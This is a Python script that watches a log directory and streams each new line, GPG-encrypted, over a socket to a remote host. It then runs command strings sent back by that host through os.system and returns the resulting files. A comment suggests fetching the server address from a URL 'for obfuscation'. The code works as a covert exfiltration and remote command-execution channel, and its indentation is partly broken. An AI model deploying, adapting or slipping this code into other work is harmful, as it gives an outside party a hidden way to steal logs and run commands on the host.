#!/usr/bin/python
import os, socket, sys, datetime
from pyWch import *
import gnupg
gpg = gnupg.GPG(gnupghome='/DirectoryOfKeysHere')
gpg.encoding = 'utf-8'
recipient = 'sys@server.com' # public key of designated target (name or email)
localHostName = str(socket.gethostname())
remoteHostName = "hostname.com" #str(urllib.request.urlopen('http://blablabla/secretconninfo.txt').read()) <-- for obfuscation
remotePort = 50007
consoleOutputOn = True
socksize = 2048
def showOutput(s):
        if consoleOutputOn == True:
                print s
	else:
		pass
showOutput("Console Output is on!")
def getCurrentDateTime():
	currentDateTime = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
	return currentDateTime
def sendDaterz(data):
	try:
		showOutput("Sending data to somewhere")
		conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		conn.connect((remoteHostName, remotePort))
		conn.send(str(gpg.encrypt(data, recipient, always_trust=True)))#always_trust must be set to true to for public keys
		receiveDaterz(conn)
		conn.close()
	except:
		pass
		showOutput("This shit isn't going anywhere...")
def receiveDaterz(conn):
    downloadMsg = str(gpg.decrypt(str(conn.recv(socksize))))
    while "Done with line" not in downloadMsg:
        curlOutFile = str(gpg.decrypt(str(conn.recv(socksize))))
        showOutput(downloadMsg)
        os.system(downloadMsg)                        # download file client side
        returnDownload(conn, curlOutFile)
        downloadMsg = str(gpg.decrypt(str(conn.recv(socksize))))
def returnDownload(conn, curlOutFile): # sends the file using binary through sockets
    	f = open(curlOutFile, 'rb')
    	l = f.read(1024)
	 while (l):
        	conn.send(l)
        	l = f.read(1024)
    	f.close()
    	conn.send('finish')
def callback(filename, lines):
	for line in lines:
		sendDaterz(line)
		showOutput(line)
		f = open(outFile, 'a')
		f.write(line)
		f.close()
if len(sys.argv) < 2:
	showOutput("Please provide a directory!\nEx: /var/log or /var/log/apache2")
	exit()
else:
	try:
		outFile = "log/" + getCurrentDateTime() + ".log"
		watcher = LogWatcher(sys.argv[1], callback)
		showOutput("Starting Log Watcher...")
		watcher.loop()
	except (KeyboardInterrupt, SystemExit):
		showOutput("I am no more")
		exit()
